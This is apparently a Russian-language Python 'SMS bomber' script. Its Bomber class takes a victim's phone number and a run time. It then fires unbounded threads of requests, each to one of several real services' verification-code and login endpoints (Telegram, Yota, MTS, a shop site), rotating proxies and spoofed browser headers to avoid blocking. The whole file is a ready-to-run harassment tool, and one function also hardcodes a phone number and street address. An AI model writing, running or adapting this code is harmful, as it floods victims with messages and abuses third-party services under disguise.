
import threading

from bs4 import BeautifulSoup
import requests
from fake_useragent import UserAgent

from loguru import logger
import coloredlogs
import verboselogs

import time
import sys
from random import choice

from bomber.models import Attack

level_styles = {
    "debug": {"color": 8},
    "info": {},
    "warning": {"color": 11},
    "error": {"color": "red"},
    "critical": {"bold": True, "color": "red"},
    "spam": {"color": "green", "faint": True},
    "verbose": {"color": "blue"},
    "notice": {"color": "magenta"},
    "success": {"bold": True, "color": "green"},
}

logfmtstr = "%(asctime)s,%(msecs)03d %(name)s %(levelname)s %(message)s"
logfmt = coloredlogs.ColoredFormatter(logfmtstr, level_styles=level_styles)

logger = verboselogs.VerboseLogger("Benefix")

coloredlogs.install(
    fmt=logfmtstr,
    stream=sys.stdout,
    level_styles=level_styles,
    milliseconds=True,
    level="DEBUG",
    logger=logger,
)


class Bomber:
    def __init__(self, phone, WorkTime, ID):
        self.phone = phone
        self.phone_plus = "+" + phone
        self.phone_parentheses = f"{phone[0]} ({phone[1]}{phone[2]}{phone[3]}) {phone[4]}{phone[5]}{phone[6]}-{phone[7]}{phone[8]}-{phone[9]}{phone[10]}"
        self.WorkTime = WorkTime
        self.ID = ID
        self.Flag = True
        # self.services = [self.pomogatel, self.mts, self.yota, self.telegram, self.lamel, self.pomogatel]
        self.services = [self.pomogatel, self.yota, self.telegram, self.pomogatel]


        self.url = "https://api.good-proxies.ru/"

    def launch(self):
        try:
            threading.Thread(target=self.timer).start()
            threading.Thread(target=self.FindProxy).start()
            threading.Thread(target=self.check_proxy).start()
            while True:
                if self.Flag:
                    threading.Thread(target=choice(self.services)).start()
                else: return
        except Exception as ex: print(ex) 

    def FindProxy(self):
        while True:
            try:
                if self.Flag:
                    r = requests.get(self.url)
                    with open("proxies.txt", "w", encoding="utf-8") as file: file.write(str(r.text))
                    proxylen = str(r.text).split('\n')
                    time.sleep(2)
                else: return
            except Exception as ex:
                print(ex)
                time.sleep(2)

    def check_proxy(self):
        try:
            if self.Flag:
                with open("proxies.txt", "r", encoding="utf-8") as file:
                    proxy = file.read().split("\n")
                RandomProxy = choice(proxy)
                return {
                    "https": "https://" + RandomProxy,
                    "http": "http://" + RandomProxy,
                }
            else: return
        except:
            pass

    def Headers(self):
        self.headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "sec-ch-ua": '"Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
            "User-Agent": UserAgent().chrome,
        }

        return self.headers

    def timer(self):
        time.sleep(self.WorkTime)
        self.Flag = False
        logger.critical(f"Закончил спамить номер по ID: {self.ID}")
        return 0

    def phone_mask(self, phone, maska):
        str_list = list(phone)
        for xxx in str_list:
            maska = maska.replace("#", xxx, 1)
        return maska

    def mts(self):
        try:
            proxy = self.check_proxy()
            requests.post(
                f"https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code/",
                params={"msisdn": self.phone},
                headers={
                    "X-Requested-With": "XMLHttpRequest",
                    "Connection": "keep-alive",
                    "Pragma": "no-cache",
                    "Cache-Control": "no-cache",
                    "Accept-Encoding": "gzip, deflate, br",
                    "User-Agent": UserAgent().chrome,
                    "DNT": "1",
                },
                proxies=proxy
            )
            time.sleep(3)
            requests.post(
                f"https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
                params={"msisdn 799": self.phone},
                headers={
                    "X-Requested-With": "XMLHttpRequest",
                    "Connection": "keep-alive",
                    "Pragma": "no-cache",
                    "Cache-Control": "no-cache",
                    "Accept-Encoding": "gzip, deflate, br",
                    "User-Agent": UserAgent().chrome,
                    "DNT": "1",
                },
                proxies=proxy
            )
            print(f"[+] MTS")
        except Exception as ex: pass

    def yota(self):
        try:
            proxy = self.check_proxy()
            r = requests.get("https://tv.yota.ru/")
            sesionId = r.cookies["SessionID"]

            r = requests.post(
                f"https://bmp.tv.yota.ru/api/v10/auth/register/msisdn",
                headers={
                    "X-Requested-With": "XMLHttpRequest",
                    "Connection": "keep-alive",
                    "Pragma": "no-cache",
                    "cookie": f"SessionID={sesionId}",
                    "Cache-Control": "no-cache",
                    "Accept-Encoding": "gzip, deflate, br",
                    "User-Agent": UserAgent().chrome,
                    "DNT": "1",
                },
                data={"msisdn": self.phone, "password": "123123"},
                proxies=proxy
            )


            print("[+] YOTA")
        except Exception as ex: pass

    def telegram(self):
        try:
            headers = {
                "authority": "my.telegram.org",
                "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest",
                "sec-ch-ua-mobile": "?0",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
                "sec-ch-ua-platform": '"Windows"',
                "origin": "https://my.telegram.org",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://my.telegram.org/auth/",
                "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
            }
            data = {"phone": self.phone_plus}
            r = requests.post(
                "https://my.telegram.org/auth/send_password",
                headers=headers,
                data=data,
                proxies=self.check_proxy()
            )


            print("[+] TELEGRAM")
        except Exception as ex: pass

    def lamel(self):
        try:
            proxy = self.check_proxy()
            r = requests.get("https://lk.lamel.shop/Account/LogOn?ReturnUrl=%2FClientForm%2FWelcomePage", proxies=proxy)
            token = r.cookies["__RequestVerificationToken"]
            time.sleep(0.2)
            params = {
                'ReturnUrl': '/ClientForm/WelcomePage',
            }
            data = {
                '__RequestVerificationToken': token,
                'CardNumber': '',
                'PasswordForCardNumber': '',
                'Phone': self.phone_plus,
                'PasswordForPhone': '123321asSs',
                'Login': '\u0412\u043E\u0439\u0442\u0438',
                'ActionEnter': 'phone',
                'EnterButtonText': '\u0412\u043E\u0439\u0442\u0438',
                'CanVirtualRegister': 'True',
            }
            r = requests.post("https://lk.lamel.shop/Account/LogOn?ReturnUrl=%2FClientForm%2FWelcomePage", data=data, params=params, proxies=proxy).text
            print("[+] lamel")
        except Exception as ex: print(ex)

    def pomogatel(self):
        try:
            json_data = {
                "address": "Москва, Шоссейная, 68",
                "country": "Россия",
                "house": "68",
                "latitude": "55.672727",
                "locality": "Москва",
                "longitude": "37.71989",
                "phoneNumber": "9388954250",
                "phoneNumberMasked": "+7(938)895-42-50",
                "roleId": "2",
                "specializationId": "32",
                "street": "Шоссейная улица",
                "type": "phone"
            }
            r = requests.post("https://www.myglo.ru/glo_sms_auth/account/sendCode",data=json_data, cert=False, proxies=self.check_proxy)
            print(r)
        except Exception as ex: print(ex)


# bomber = Bomber("79382342424", 500, 555).launch()
# set active 0
# Поставить актив 0


